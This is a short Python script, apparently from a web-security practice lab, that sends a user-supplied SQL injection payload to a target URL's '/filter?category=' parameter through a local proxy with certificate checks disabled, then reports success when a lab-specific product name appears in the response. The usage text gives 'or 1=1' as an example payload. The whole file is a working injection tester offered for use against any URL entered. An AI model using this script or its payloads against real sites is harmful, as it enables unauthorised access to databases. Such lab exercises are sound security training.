import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = input("What is target URL:  ")
payload = input("Payload: ")
def exploit_sqli(url,payload):
    uri = "/filter?category="
    request = requests.get(url.strip() + uri + payload.strip(), verify=False, proxies= proxies)
    if ("Cheshire Cat Grin" in request.text):
        return True
    else:
        return False

if __name__ == "__main__":
    try:
       if exploit_sqli(url, payload):
           print("[+] SQLi Successful")
       else:
           print("[-] SQLi unsuccessful")
    except IndexError:
        print(f"[-]Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-]Example: {sys.argv[0]} URL:example.com, payload: 'or 1=1' ")
        sys.exit(-1)